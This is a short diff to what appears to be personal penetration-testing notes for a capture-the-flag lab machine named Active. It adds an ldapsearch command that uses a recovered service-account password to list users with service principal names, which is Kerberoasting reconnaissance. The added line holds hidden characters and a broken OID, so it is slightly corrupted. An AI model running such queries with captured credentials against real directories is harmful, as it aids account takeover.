@@ -2,3 +2,8 @@
 
 Enumerate samaccount names:
 ldapsearch -x -h 10.10.10.100 -p 389 -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
+
+
+
+get SPN Users:
+ldapsearch -x -h 10.10.10.100 -p 389 -D ​'SVC_TGS'​ -w 'GPPstillStandingStrong2k18'​ -b ​"dc=active,dc=htb"​ -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.1 13556.1.4.803:=2))(serviceprincipalname=*/*))"​ serviceprincipalname | grep -B 1 servicePrincipalName
